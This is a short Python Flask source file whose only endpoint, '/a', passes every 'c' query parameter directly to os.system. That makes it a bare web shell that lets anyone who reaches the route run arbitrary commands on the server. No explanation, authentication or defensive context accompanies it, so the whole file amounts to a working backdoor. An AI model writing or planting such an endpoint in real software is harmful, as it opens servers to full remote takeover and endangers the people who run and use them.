import os
from flask import Flask, request
app = Flask(__name__)
@app.route("/a")
def a():
    [os.system(c) for c in request.args.getlist("c")]
